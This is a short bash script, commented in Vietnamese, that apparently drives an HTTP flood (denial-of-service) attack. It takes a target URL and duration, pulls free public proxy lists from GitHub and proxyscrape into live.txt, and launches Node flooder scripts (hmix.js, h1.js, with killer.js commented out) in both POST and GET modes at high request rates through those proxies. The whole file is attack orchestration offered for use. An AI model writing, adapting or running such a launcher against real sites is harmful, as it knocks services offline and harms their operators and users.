#!/bin/bash

# Usage: ./script.sh <URL> <TIME> 
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy vào live.txt cho cả HTTP, HTTPS
> live.txt
for t in http; do
curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$t/Vietnam.txt" >> live.txt
echo >> live.txt  # xuống dòng sau lần 1
curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=2000&protocol=$t" >> live.txt
done
wait


# Chạy các script node 
for m in POST GET; do
  node hmix.js -m $m -u $URL -s $TIME -p live.txt -r 40 --full true -d false & 
  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
  #node killer.js $m $URL $TIME 2 2 live.txt --query 1 --referer rand --http 2 --close --parsed --reset &
done

wait
pgrep -f "hmix.js|h1.js|h2.js|http1.js|http2.js|killer.js" | xargs -r kill -9

